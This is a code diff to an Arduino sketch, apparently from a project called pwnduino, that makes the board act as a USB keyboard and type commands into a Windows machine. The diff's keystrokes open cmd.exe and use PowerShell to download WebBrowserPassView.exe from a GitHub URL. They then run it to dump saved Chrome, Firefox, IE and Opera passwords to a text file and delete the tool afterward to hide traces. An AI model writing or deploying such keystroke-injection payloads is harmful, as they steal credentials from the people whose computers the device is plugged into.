@@ -20,6 +20,9 @@ uint8_t buf[8] = { 0 }; //buffer
 const int ledPin = 13;
 
 
+
+/////////////////////////////////////////////
+
 void setup()
 {
    Serial.begin(9600);
@@ -30,22 +33,34 @@ void setup()
    keyRelease(); // Release the key
    delay(200);
 
-   // Run cmd.exe
+   // Run powershell.exe
    keyString("cmd.exe"); // Enter string
-   delay(500);
    keyPress(0, KEY_ENTER); // Press enter
    keyRelease(); // Release the key
    delay(500);
 
+/*
+   keyString("powershell");
+   keyPress(0, KEY_ENTER);
+   keyRelease();
+   delay(500);*/
+   
    // Run powershell command
-   keyString("powershell wget https://github.com/ex0dus-0x/pwnduino/blob/master//WebBrowserPassView.exe/ -Outfile WebBrowserPassView.exe");
-   delay(500);
+   keyString("powershell -command (New-Object System.Net.WebClient).DownloadFile('https://github.com/ex0dus-0x/pwnduino/blob/master/deps/WebBrowserPassView.exe', 'WebBrowserPassView.exe')");
    keyPress(0, KEY_ENTER);
    keyRelease();
    delay(500);
 
    // Extract Passwords
    keyString("WebBrowserPassView.exe /LoadPasswordsChrome 1 /LoadPasswordsFirefox 1 /LoadPasswordsIE 1 /LoadPasswordsOpera 1 /stext passwords.txt");
+   keyPress(0, KEY_ENTER);
+   keyRelease();
+   delay(500);
+
+   // Remove WebBrowserPassViewer
+   keyString("Remove-Item WebBrowserPassView.exe");
+   keyPress(0, KEY_ENTER);
+   keyRelease();
    delay(500);
  }
 
@@ -58,12 +73,20 @@ void loop()
   digitalWrite(ledPin, LOW);
 }
 
+
+void keyPress(int mod, int key) {
+  buf[0] = mod;
+  buf[2] = key;
+  Serial.write(buf, 8);
+}
+
 void keyRelease()
 {
   buf[0] = 0;
   buf[2] = 0;
   Serial.write(buf, 8);	// Release key
 }
+
 
 void keyString(String text) {
   char alpha[] = {'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z'};
@@ -114,10 +137,4 @@ void keyString(String text) {
 
     }
   }
-}
-
-void keyPress(int mod, int key) {
-  buf[0] = mod;
-  buf[2] = key;
-  Serial.write(buf, 8);
 }
